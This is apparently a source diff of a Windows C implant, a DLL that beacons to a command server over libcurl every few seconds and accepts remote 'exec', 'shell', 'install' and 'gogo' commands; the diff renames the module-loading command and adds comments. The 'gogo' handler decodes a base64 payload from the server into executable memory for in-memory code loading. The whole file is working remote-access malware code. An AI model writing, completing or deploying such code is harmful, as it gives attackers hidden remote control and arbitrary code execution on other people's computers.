@@ -1,4 +1,4 @@
-// cl.exe /LD /MD main.c moduleloader.c /Fo.\obj\ /O2 /Ot /GL
+// cl.exe /LD /MD main.c gadget_loader.c /Fo.\obj\ /O2 /Ot /GL
 
 #include "common.h"
 #include <string.h>
@@ -21,26 +21,40 @@
 #pragma comment(lib, "wldap32.lib")
 #pragma comment(lib, "tinycurl\\lib\\libcurl_a.lib")
 
-#define dprint(x)
+// Function declarations
+int   main(void);
+void  jitter_connect(void);
+void  command_loop(void);
+char* execute_command(const char *cmd);
+void  update_curl_headers(void);
+__declspec(dllexport) void MainExport(void);
+// Built-in functions
+char* CMD_exec(char* args);
+char* CMD_shell(char* args);
+char* CMD_gogo(char* args);
+char* CMD_quit(char* args);
+char* CMD_install(char* args);
+
+// This is the list of available commands the client can run
 CommandNode* commandList = NULL;
 
-int main(void);
-void jitter_connect(void);
-void command_loop(void);
-char *execute_command(const char *cmd);
-void update_curl_headers(void);
-
-__declspec(dllexport) void MainExport(void);
-
-// Global used to send data back to the server
+// Global used to store response sent back to the server
+// For example: recv: `exec ls`; STORED_RESPONSE: ".bashrc myfile.txt etc..."
 char* STORED_RESPONSE = NULL;
-// Commands header info
-char* COMMANDS_HEADER = "Commands: ";
-char* AVAILABLE_COMMANDS = NULL;
-char* CLIENTID = "clientid: 10"; // TODO
-char* CURRENT_COMMAND = NULL; // TODO: Make this not a global?
-struct curl_slist *CLIENT_HEADERS = NULL;
 
+// Commands header info
+char* COMMANDS_HEADER = "Commands: ";   // This is the header for commandsList
+char* AVAILABLE_COMMANDS = NULL;        // This sends commandsList to the server
+
+// Clientid header info
+char* CLIENTID = "clientid: 10"; // TODO: It needs to be generated on the client, not static
+
+// Sent back to the server, tells it what command the results are for
+// For `exec` calls, will be the command like "ls" or "dir"
+char* CURRENT_COMMAND = NULL;
+
+// This is the linked list of headers supplied to curl
+struct curl_slist *CLIENT_HEADERS = NULL;
 
 // Built-in Commands
 char* CMD_exec(char* args)
@@ -56,24 +70,24 @@ char* CMD_shell(char* args)
     return NULL;
 }
 
-char* CMD_load(char* args)
+char* CMD_gogo(char* args)
 {
-    debugf("Received load command with arguments: %s\n", args);
-    size_t module_len = 0;
-    unsigned char* module = base64_decode(args, strlen(args), &module_len);
+    debugf("Received gogo command with arguments: %s\n", args);
+    size_t gadget_len = 0;
+    unsigned char* gadget = base64_decode(args, strlen(args), &gadget_len);
     LPVOID lpBuffer = NULL;
     HANDLE hModule  = NULL;
 
-    if (module == NULL)
+    if (gadget == NULL)
         return NULL;
     
-    debugf("Module: %p", module);
-    debugf("Module length: %zu\n", module_len);
-    lpBuffer = VirtualAlloc(NULL, module_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    debugf("gadget: %p", gadget);
+    debugf("gadget length: %zu\n", gadget_len);
+    lpBuffer = VirtualAlloc(NULL, gadget_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if( !lpBuffer )
 		BREAK_WITH_ERROR( "Failed to allocate space" );
 
-    memcpy(lpBuffer, module, module_len);
+    memcpy(lpBuffer, gadget, gadget_len);
     debugf("memcpy\n");
     fflush(stdout);
 
@@ -150,11 +164,11 @@ int main(void)
     // Initialize built-in commands
     insertCommandNode(&commandList, createCommandNode("exec", CMD_exec));
     insertCommandNode(&commandList, createCommandNode("shell", CMD_shell));
-    insertCommandNode(&commandList, createCommandNode("load", CMD_load));
+    insertCommandNode(&commandList, createCommandNode("gogo", CMD_gogo));
     insertCommandNode(&commandList, createCommandNode("quit", CMD_quit));
     insertCommandNode(&commandList, createCommandNode("install", CMD_install));
 
-    // Initialize available commands that the server returns; updated in `load` command
+    // Initialize available commands that the server returns; updated in `gogo` command
     debugf("Getting commands\n");
     AVAILABLE_COMMANDS = getCommands(commandList, COMMANDS_HEADER);
     update_curl_headers();
@@ -171,12 +185,11 @@ int main(void)
 void jitter_connect()
 {
     // TODO: Make this jitter instead of a constant time.
-    // Seperate initial connect from interactive connection
+    // Seperate initial connect from interactive connection?
+    // Initial connect will probably be handled by a wrapper program, in case of crashes in this one
     while (1)
     {
         command_loop();
-        // Sleep for 5 minutes (in milliseconds)
-        // Sleep(5 * 60 * 1000);
         Sleep(5 * 1000);  
     }
 }
